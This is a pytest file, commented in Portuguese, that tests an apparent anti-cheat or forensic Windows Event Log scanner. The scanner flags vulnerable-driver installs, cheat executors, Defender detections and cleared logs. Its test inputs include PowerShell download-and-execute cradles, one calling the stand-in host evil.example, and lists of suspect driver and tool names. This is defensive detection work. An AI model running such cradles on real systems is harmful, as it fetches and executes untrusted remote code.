"""
Testes do scanner de Event Log de execução (scan_windows_events — 7045/4104).

Prova:
  - Parser de XML do wevtutil extrai os <Data Name=...> e o TimeCreated.
  - Classificadores puros: 7045 de BYOVD casa por nome EXATO (não FP com
    substring tipo 'asio'); executor por keyword; serviço em pasta de usuário.
    4104 casa download cradle / nome de executor.
  - O scanner monta itens com a severidade certa e o matched que FUNDE com o
    scan_kernel_drivers (driver-byovd:<nome>).
  - Integração: registrado, slug event_log_exec (peso + label), script block
    cai como intent (anti_forense) no _infer_kind.
"""

import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import winevent_scanner as we  # noqa: E402


_XML_7045 = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><EventID>7045</EventID>'
    '<TimeCreated SystemTime="2026-06-28T18:30:45.123Z"/></System>'
    '<EventData>'
    '<Data Name="ServiceName">winring0</Data>'
    '<Data Name="ImagePath">C:\\Users\\x\\Downloads\\winring0.sys</Data>'
    '<Data Name="ServiceType">kernel mode driver</Data>'
    '</EventData></Event>'
)


# ----------------------------- parser -----------------------------

def test_parse_extracts_data_and_time():
    evs = we._parse_events(_XML_7045)
    assert len(evs) == 1
    e = evs[0]
    assert e["ServiceName"] == "winring0"
    assert "winring0.sys" in e["ImagePath"]
    assert e["_time"].startswith("2026-06-28T18:30:45")


def test_parse_ignores_garbage():
    assert we._parse_events("lixo sem evento") == []


# ----------------------------- 7045 puro -----------------------------

def test_byovd_exact_name_high():
    res = we._classify_service_install("winring0", r"C:\X\winring0.sys")
    assert res is not None
    sev, matched, _ = res
    assert sev == "high"
    assert matched == "driver-byovd:winring0"  # FUNDE com scan_kernel_drivers


def test_byovd_no_substring_false_positive():
    """'asio' está na lista; um 'realtekasio' NÃO pode casar (nome exato)."""
    assert we._classify_service_install("realtekasio", r"C:\X\realtekasio.sys") is None


def test_service_executor_keyword_high():
    res = we._classify_service_install("kdmapper", r"C:\X\kdmapper.exe")
    assert res and res[0] == "high"
    assert res[1] == "kdmapper"  # bare kw -> cluster com o executor


def test_kernel_driver_user_path_medium():
    """Driver KERNEL de pasta de usuário = MEDIUM (padrão de BYOVD-dropper)."""
    res = we._classify_service_install(
        "MyDrv", r"C:\Users\x\AppData\Local\Temp\drv.sys", "kernel mode driver")
    assert res and res[0] == "medium" and res[1] == "svc-install-userpath-driver"


# ============== REGRESSÃO v3.42.0: FPs em PC de dev/produtividade ==============
#
# Reportados no run de smoke test do dono (v3.42.0):
#   ● [HIGH] KProcessHacker3 → match: process hacker
#   ● [MEDIUM] PDFWKRNL → svc-install-userpath-driver
# Process Hacker é dual-use (sysadmin/dev/security); install OFICIAL em
# Program Files não é BYOVD. PDFWKRNL é driver kernel de PDF virtual printer
# (BullZip/Foxit/PDF24 etc.), nome bem específico de software legítimo.

def test_process_hacker_official_install_suppressed():
    """REGRESSÃO: KProcessHacker3 com ImagePath em \\Program Files\\Process Hacker 2\\
    NÃO flagga — install oficial. Outras fontes (BAM, Prefetch, MUICache) ainda
    pegam a presença como LOW; aqui suprimimos a duplicação do Event Log."""
    res = we._classify_service_install(
        "KProcessHacker3",
        r"C:\Program Files\Process Hacker 2\kprocesshacker.sys",
        "kernel mode driver")
    assert res is None


def test_system_informer_official_install_suppressed():
    """System Informer (fork ativo do Process Hacker) — instalação em
    %LOCALAPPDATA%\\Programs\\System Informer\\."""
    res = we._classify_service_install(
        "KSystemInformer",
        r"C:\Users\gabri\AppData\Local\Programs\System Informer\SystemInformer.sys",
        "kernel mode driver")
    assert res is None


def test_process_hacker_portable_in_downloads_still_flagged():
    """ANTI-bypass: Process Hacker portable extraído em Downloads (pasta com
    nome 'Process Hacker 2' fora do install oficial) continua flagga via
    match_keyword. Suppression é SÓ pra Program Files / install oficial —
    adversário usando portable extraído em path de user mantém o sinal."""
    res = we._classify_service_install(
        "KProcessHacker3",
        r"C:\Users\x\Downloads\Process Hacker 2\kprocesshacker.sys",
        "kernel mode driver")
    assert res is not None
    sev, _, _ = res
    assert sev == "high"  # casa keyword "process hacker" via path com espaço


def test_random_kernel_driver_in_downloads_with_obscure_name_medium():
    """Kernel driver com nome NÃO em SUSPECT/BENIGN e SEM keyword no path,
    plantado em Downloads, ainda vira MEDIUM via svc-install-userpath-driver."""
    res = we._classify_service_install(
        "KProcessHacker3",  # nome não casa keyword sozinho (sem espaço)
        r"C:\Users\x\Downloads\kprocesshacker.sys",  # path idem
        "kernel mode driver")
    assert res is not None
    sev, matched, _ = res
    assert sev == "medium"
    assert matched == "svc-install-userpath-driver"


def test_pdfwkrnl_benign_driver_suppressed():
    """REGRESSÃO: PDFWKRNL (BullZip PDF Writer) instalado de Downloads NÃO
    flagga — nome em BENIGN_KERNEL_DRIVERS, embora path seja de user
    (instaladores comumente rodam de Downloads)."""
    res = we._classify_service_install(
        "PDFWKRNL",
        r"C:\Users\x\Downloads\bzpdfwriter_setup_temp\pdfwkrnl.sys",
        "kernel mode driver")
    assert res is None


def test_pdf24_benign_driver_suppressed():
    """Outro driver da BENIGN_KERNEL_DRIVERS pra garantir cobertura."""
    res = we._classify_service_install(
        "pdf24",
        r"C:\Users\x\Downloads\pdf24creator\pdf24.sys",
        "kernel mode driver")
    assert res is None


def test_random_userpath_kernel_driver_still_flagged():
    """ANTI-bypass: kernel driver com nome aleatório em Downloads continua
    MEDIUM. Suppression é SÓ pra nomes EXPLICITAMENTE benignos."""
    res = we._classify_service_install(
        "RandomDriver",
        r"C:\Users\x\Downloads\randomdriver.sys",
        "kernel mode driver")
    assert res is not None
    sev, matched, _ = res
    assert sev == "medium"
    assert matched == "svc-install-userpath-driver"


def test_benign_drivers_list_present_in_module():
    """Importação correta de BENIGN_KERNEL_DRIVERS / LEGIT_DEV_INSTALL_PATHS."""
    assert "pdfwkrnl" in we.BENIGN_KERNEL_DRIVERS
    assert any("process hacker" in p for p in we.LEGIT_DEV_INSTALL_PATHS)


def test_usermode_service_user_path_clean():
    """Serviço USERMODE de %AppData% (updater legítimo etc.) NÃO flagga — só
    driver kernel-mode. Evita FP barulhento."""
    res = we._classify_service_install(
        "MyUpdater", r"C:\Users\x\AppData\Local\App\updater.exe", "user mode service")
    assert res is None


def test_service_legit_system_clean():
    assert we._classify_service_install(
        "Spooler", r"C:\Windows\System32\spoolsv.exe", "user mode service") is None


# ----------------------------- 4104 puro -----------------------------

def test_scriptblock_download_cradle_high():
    """Baixar E executar (iex) na mesma linha = cradle clássico -> HIGH."""
    res = we._classify_scriptblock("IEX (New-Object Net.WebClient).DownloadString('http://x/a.ps1')")
    assert res and res[0] == "high"
    assert res[1] == "ps-scriptblock:download+iex"


def test_scriptblock_executor_name_high():
    res = we._classify_scriptblock("Start-Process solara.exe")
    assert res and res[0] == "high"
    assert res[1] == "solara"


def test_scriptblock_bare_download_clean():
    """Download PURO (iwr/Invoke-WebRequest sem iex) é uso legítimo comum de
    PowerShell — NÃO flagga. Era um FP forte antes do hardening."""
    assert we._classify_scriptblock(
        "Invoke-WebRequest -OutFile update.zip https://contoso.com/update.zip") is None
    assert we._classify_scriptblock("iwr https://x/file.txt -o file.txt") is None


def test_scriptblock_benign_clean():
    assert we._classify_scriptblock("Get-ChildItem | Sort-Object Name") is None


# TRUSTED_DOMAINS nasce vazio (popula de trusted_domains.json local); os testes
# injetam um domínio sintético e limpam depois (herméticos).
_TRUSTED_TEST_DOMAIN = "allowlisted.test"


def _with_trusted(fn):
    import database
    database.TRUSTED_DOMAINS.add(_TRUSTED_TEST_DOMAIN)
    try:
        fn()
    finally:
        database.TRUSTED_DOMAINS.discard(_TRUSTED_TEST_DOMAIN)


def test_scriptblock_trusted_domain_cradle_clean():
    """FP: cradle (download+iex) de DOMÍNIO CONFIÁVEL (allowlist) é instalador
    legítimo do dono (steamtools etc.) — NÃO flagga. Inclui o script grande
    baixado em memória que só casa (b) por ter download e iex soltos."""
    def check():
        assert we._classify_scriptblock(
            f'iex (irm "https://{_TRUSTED_TEST_DOMAIN}/install-plugin.ps1")') is None
        assert we._classify_scriptblock(
            "# its own non-fatal hiccups (temp-zip cleanup)\n"
            f"$d = irm https://{_TRUSTED_TEST_DOMAIN}/x ; iex $d") is None
    _with_trusted(check)


def test_scriptblock_trusted_domain_does_not_clear_executor():
    """Domínio confiável NÃO dá passe pra nome de executor real no mesmo script:
    se cita 'solara', é evidência independente -> continua HIGH."""
    def check():
        res = we._classify_scriptblock(
            f'iex (irm "https://{_TRUSTED_TEST_DOMAIN}/x.ps1"); Start-Process solara.exe')
        assert res and res[0] == "high" and res[1] == "solara"
    _with_trusted(check)


def test_scriptblock_untrusted_cradle_still_high():
    """Não pode regredir: cradle de domínio NÃO-confiável continua HIGH."""
    res = we._classify_scriptblock('iex (irm "https://evil.example/x.ps1")')
    assert res and res[0] == "high"
    assert res[1] == "ps-scriptblock:download+iex"


# ----------------------------- scanner (mockado) -----------------------------

def _patch(monkeypatch, system=None, ps=None, security=None):
    def fake_query(channel, event_id, count=300, parser=None):
        if event_id == 7045:
            return system
        if event_id == 4104:
            return ps
        if event_id == 4688:
            return security
        return None
    monkeypatch.setattr(we, "_query_events", fake_query)


def test_scanner_flags_byovd_7045(monkeypatch):
    _patch(monkeypatch, system=[{
        "ServiceName": "mhyprot2", "ImagePath": r"C:\X\mhyprot2.sys",
        "_time": "2026-06-28T10:00:00Z"}], ps=[])
    r = we.scan_windows_events()
    assert r["status"] == "suspicious"
    it = r["items"][0]
    assert it["severity"] == "high"
    assert it["matched"] == "driver-byovd:mhyprot2"


def test_scanner_dedups_repeated_service_install(monkeypatch):
    """Mesmo driver reinstalado N vezes (N eventos 7045) -> 1 item só."""
    ev = {"ServiceName": "winring0", "ImagePath": r"C:\X\winring0.sys",
          "_time": "2026-06-28T10:00:00Z"}
    _patch(monkeypatch, system=[ev, ev, ev, ev, ev], ps=[])
    r = we.scan_windows_events()
    assert len(r["items"]) == 1
    assert r["items"][0]["matched"] == "driver-byovd:winring0"


def test_scanner_keeps_distinct_userpath_services(monkeypatch):
    """Dois DRIVERS kernel diferentes em pasta de usuário (mesmo matched genérico)
    NÃO podem colapsar num só."""
    _patch(monkeypatch, system=[
        {"ServiceName": "DrvA", "ImagePath": r"C:\Users\x\Temp\a.sys",
         "ServiceType": "kernel mode driver", "_time": ""},
        {"ServiceName": "DrvB", "ImagePath": r"C:\Users\x\Temp\b.sys",
         "ServiceType": "kernel mode driver", "_time": ""},
    ], ps=[])
    r = we.scan_windows_events()
    assert len(r["items"]) == 2


def test_scanner_dedups_multipart_scriptblock(monkeypatch):
    """Script multi-parte gera vários 4104 com o mesmo matched — só 1 item."""
    blob = {"ScriptBlockText": "iex (iwr http://x/a.ps1)", "_time": "2026-06-28T10:00:00Z"}
    _patch(monkeypatch, system=[], ps=[blob, blob, blob])
    r = we.scan_windows_events()
    assert len([i for i in r["items"] if i["matched"].startswith("ps-scriptblock")]) == 1


def test_process_creation_4688_executor_high():
    res = we._classify_process_creation(
        r"C:\Users\x\Downloads\solara.exe", "solara.exe --inject")
    assert res == ("high", "solara")


def test_process_creation_4688_benign_none():
    assert we._classify_process_creation(r"C:\Windows\System32\notepad.exe", "") is None


def test_scanner_flags_4688_executor(monkeypatch):
    _patch(monkeypatch, system=[], ps=[], security=[
        {"NewProcessName": r"C:\Users\x\Downloads\solara.exe",
         "CommandLine": "", "_time": "2026-06-28T10:00:00Z"}])
    r = we.scan_windows_events()
    it = [i for i in r["items"] if i["matched"] == "solara"]
    assert it and it[0]["severity"] == "high"


def test_scanner_dedups_4688(monkeypatch):
    ev = {"NewProcessName": r"C:\X\solara.exe", "CommandLine": "", "_time": ""}
    _patch(monkeypatch, system=[], ps=[], security=[ev, ev, ev])
    r = we.scan_windows_events()
    assert len([i for i in r["items"] if i["matched"] == "solara"]) == 1


def test_scanner_clean_when_nothing_matches(monkeypatch):
    _patch(monkeypatch,
           system=[{"ServiceName": "Spooler", "ImagePath": r"C:\Windows\System32\spoolsv.exe", "_time": ""}],
           ps=[{"ScriptBlockText": "Get-Process", "_time": ""}])
    assert we.scan_windows_events()["status"] == "clean"


def test_scanner_error_when_no_access(monkeypatch):
    """Sem acesso a NENHUM log (ambos None) -> erro, não 'clean'."""
    _patch(monkeypatch, system=None, ps=None)
    assert we.scan_windows_events()["status"] == "error"


# ----------------------------- integração -----------------------------

def test_registered_in_scanner_list():
    assert we.scan_windows_events in we.ALL_WINEVENT_SCANNERS


def test_slug_weight_and_label():
    import evidence as ev
    import report_assets
    assert ev._source_slug_from_name("Event Log de execução (7045/4104)") == "event_log_exec"
    assert "event_log_exec" in ev.SOURCE_WEIGHTS
    assert "event_log_exec" in report_assets.SOURCE_LABELS


def test_scriptblock_categorized_as_intent():
    """matched ps-scriptblock: deve cair como anti_forense (intent), não executor."""
    import evidence as ev
    assert ev._infer_kind("PowerShell script block", "ps-scriptblock:iwr") == "anti_forense"


def test_byovd_event_merges_with_kernel_driver():
    """7045 de winring0 e o scan_kernel_drivers usam o MESMO matched -> mesmo
    kind byovd (fundem no cluster)."""
    import evidence as ev
    assert ev._infer_kind("Serviço/driver instalado: winring0.sys",
                          "driver-byovd:winring0") == "byovd"


# ----------------------------- Defender detection (1116/1117) -----------------------------

_XML_DEFENDER_USERDATA = (
    '<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">'
    '<System><EventID>1116</EventID>'
    '<TimeCreated SystemTime="2026-06-28T20:00:00.0Z"/></System>'
    '<UserData><EventXML xmlns="myns">'
    '<Threat Name="HackTool:Win32/Solara"/>'
    '<Path>C:\\Users\\x\\Downloads\\solara.exe</Path>'
    '</EventXML></UserData></Event>'
)


def test_blob_parser_schema_agnostic():
    """Evento Defender com schema UserData (sem <Data Name>) ainda extrai texto."""
    evs = we._parse_event_blobs(_XML_DEFENDER_USERDATA)
    assert len(evs) == 1
    assert "solara.exe" in evs[0]["_blob"]
    assert evs[0]["_time"].startswith("2026-06-28T20:00:00")


def test_defender_executor_name_high():
    res = we._classify_defender_detection("Threat HackTool:Win32/Solara C:/x/solara.exe")
    assert res and res[0] == "high"
    assert res[1] == "solara"  # FUNDE no cluster do executor


def test_defender_generic_hacktool_medium():
    res = we._classify_defender_detection("HackTool:Win32/Generic detected")
    assert res and res[0] == "medium"
    assert res[1] == "defender-detection:hacktool"


def test_defender_unrelated_threat_clean():
    """PUA/trojan genérico SEM termo de cheat nem executor -> não flagga (anti-FP)."""
    assert we._classify_defender_detection("Trojan:Win32/Wacatac.B!ml em C:/temp/x") is None


def _patch_defender(monkeypatch, blobs):
    def fake_query(channel, event_id, count=300, parser=None):
        if "Defender" in channel:
            return blobs
        return None
    monkeypatch.setattr(we, "_query_events", fake_query)


def test_scanner_flags_defender_detection(monkeypatch):
    _patch_defender(monkeypatch, [
        {"_blob": "HackTool:Win32/Solara C:/Users/x/Downloads/solara.exe", "_time": "2026-06-28T20:00:00Z"}])
    r = we.scan_defender_events()
    assert r["status"] == "suspicious"
    it = r["items"][0]
    assert it["severity"] == "high" and it["matched"] == "solara"


def test_scanner_defender_dedup(monkeypatch):
    b = {"_blob": "HackTool:Win32/Generic", "_time": ""}
    _patch_defender(monkeypatch, [b, b, b])
    assert len(we.scan_defender_events()["items"]) == 1


def test_scanner_defender_error_when_no_access(monkeypatch):
    _patch_defender(monkeypatch, None)
    assert we.scan_defender_events()["status"] == "error"


def test_defender_registered_and_routed():
    import evidence as ev
    import report_assets
    assert we.scan_defender_events in we.ALL_WINEVENT_SCANNERS
    assert ev._source_slug_from_name(
        "Defender: detecção de ameaça (Event Log 1116/1117)") == "defender_detection"
    assert "defender_detection" in ev.SOURCE_WEIGHTS
    assert "defender_detection" in report_assets.SOURCE_LABELS


def test_defender_real_machine_no_crash():
    r = we.scan_defender_events()
    assert r["status"] in ("clean", "suspicious", "error")
    for it in r["items"]:
        assert it["severity"] in ("high", "medium")


# ============== scan_log_clearance (104 / 3079 / 501) ==============
#
# 104 = log NÃO-Security limpo via clear-log (Security já é 1102, em extra_forensics).
# 3079 (Application) / 501 (System NTFS) = USN journal apagado/truncado.

def test_classify_log_cleared_high():
    res = we._classify_log_cleared("System")
    assert res is not None
    sev, matched, label = res
    assert sev == "high"
    assert matched == "log-cleared:system"
    assert label == "System"


def test_classify_log_cleared_empty_none():
    assert we._classify_log_cleared("") is None


def test_classify_usn_cleared_medium():
    sev, matched, label = we._classify_usn_cleared("Application")
    assert sev == "medium"
    assert matched == "usn-cleared:application"
    assert label == "Application"


def _patch_log_clearance(monkeypatch, mapping, captured_calls=None):
    """mapping: {(channel, eid, provider): events_or_None}. Faltando = None.
    Se captured_calls (list) for passada, cada chamada vira (channel, eid, provider)."""
    def fake(channel, event_id, count=300, parser=we._parse_events, provider=None):
        if captured_calls is not None:
            captured_calls.append((channel, event_id, provider))
        return mapping.get((channel, event_id, provider))
    monkeypatch.setattr(we, "_query_events", fake)


def test_scan_clearance_104_system_high(monkeypatch):
    """104 no System (Provider Microsoft-Windows-Eventlog) = log limpo → HIGH."""
    _patch_log_clearance(monkeypatch, {
        ("System",      104,  "Microsoft-Windows-Eventlog"):
            [{"_blob": "eventlog cleared", "_time": "2026-06-29T10:00:00Z"}],
        ("Application", 104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 3079, "Ntfs"): [],
        ("Microsoft-Windows-Ntfs/Operational", 501, "Ntfs"): [],
        ("System",      501,  "Ntfs"): [],
    })
    r = we.scan_log_clearance()
    assert r["status"] == "suspicious"
    assert any(it["matched"] == "log-cleared:system" for it in r["items"])
    assert all(it["severity"] in ("high", "medium") for it in r["items"])


def test_scan_clearance_usn_medium(monkeypatch):
    """3079 (Application/Ntfs) e 501 (Ntfs/Operational/Ntfs) = USN apagado → MEDIUM."""
    _patch_log_clearance(monkeypatch, {
        ("System",      104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 3079, "Ntfs"):
            [{"_blob": "usn truncated", "_time": "2026-06-29T11:00:00Z"}],
        ("Microsoft-Windows-Ntfs/Operational", 501, "Ntfs"):
            [{"_blob": "ntfs usn", "_time": "2026-06-29T11:01:00Z"}],
    })
    r = we.scan_log_clearance()
    matched = {it["matched"] for it in r["items"]}
    assert "usn-cleared:application" in matched
    assert "usn-cleared:system" in matched
    for it in r["items"]:
        assert it["severity"] == "medium"


def test_scan_clearance_501_fallback_to_system(monkeypatch):
    """501 com canal Ntfs/Operational vazio mas presente em System (fallback)."""
    _patch_log_clearance(monkeypatch, {
        ("System",      104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 3079, "Ntfs"): [],
        ("Microsoft-Windows-Ntfs/Operational", 501, "Ntfs"): [],  # vazio
        ("System",      501,  "Ntfs"):
            [{"_blob": "ntfs", "_time": "2026-06-29T12:00:00Z"}],
    })
    r = we.scan_log_clearance()
    assert any(it["matched"] == "usn-cleared:system" for it in r["items"])


def test_scan_clearance_clean_when_empty(monkeypatch):
    """Todos canais com 0 eventos = clean (acesso ok, nada apagado)."""
    _patch_log_clearance(monkeypatch, {
        ("System",      104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 3079, "Ntfs"): [],
        ("Microsoft-Windows-Ntfs/Operational", 501, "Ntfs"): [],
        ("System",      501,  "Ntfs"): [],
    })
    assert we.scan_log_clearance()["status"] == "clean"


def test_scan_clearance_error_when_no_access(monkeypatch):
    """Nenhum canal acessível (todos None) = error."""
    _patch_log_clearance(monkeypatch, {})
    assert we.scan_log_clearance()["status"] == "error"


def test_scan_clearance_passes_provider_filter(monkeypatch):
    """REGRESSÃO BUG #1: 104 SEMPRE consultado com Provider=Microsoft-Windows-Eventlog
    (sem o filtro, pega 104 de DOTNETRuntime/Office, gera FP em qualquer PC)."""
    calls = []
    _patch_log_clearance(monkeypatch, {
        ("System",      104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 104,  "Microsoft-Windows-Eventlog"): [],
        ("Application", 3079, "Ntfs"): [],
        ("Microsoft-Windows-Ntfs/Operational", 501, "Ntfs"): [],
        ("System",      501,  "Ntfs"): [],
    }, captured_calls=calls)
    we.scan_log_clearance()
    # Todas chamadas pra 104 têm que ter o provider correto
    for ch, eid, prov in calls:
        if eid == 104:
            assert prov == "Microsoft-Windows-Eventlog", (
                f"104 chamado SEM provider em {ch} — vai pegar FP")
        elif eid in (501, 3079):
            assert prov == "Ntfs", f"{eid} chamado SEM provider Ntfs em {ch}"


def test_query_events_provider_in_query():
    """REGRESSÃO BUG #1: _query_events com provider monta filtro Provider[@Name=...]."""
    # Não roda wevtutil — só monta a query e verifica via intercepção do subprocess
    captured = {}
    class FakeRes:
        returncode = 0
        stdout = b""
    def fake_run(cmd, capture_output=True, timeout=30):
        captured["cmd"] = cmd
        return FakeRes()
    import subprocess as _sp
    orig = _sp.run
    _sp.run = fake_run
    try:
        we._query_events("System", 104, provider="Microsoft-Windows-Eventlog")
    finally:
        _sp.run = orig
    query = next(a for a in captured["cmd"] if a.startswith("/q:"))
    assert "Provider[@Name='Microsoft-Windows-Eventlog']" in query
    assert "(EventID=104)" in query


def test_clearance_registered_and_routed():
    import evidence as ev
    import report_assets
    assert we.scan_log_clearance in we.ALL_WINEVENT_SCANNERS
    # nome do scanner casa o slug anti_forense pelo mapper (contém "event log")
    slug = ev._source_slug_from_name("Event Log: limpeza (104/501/3079)")
    assert slug == "anti_forense"
    assert "anti_forense" in ev.SOURCE_WEIGHTS
    assert "anti_forense" in report_assets.SOURCE_LABELS


def test_clearance_real_machine_no_crash():
    r = we.scan_log_clearance()
    assert r["status"] in ("clean", "suspicious", "error")
    for it in r["items"]:
        assert it["severity"] in ("high", "medium")
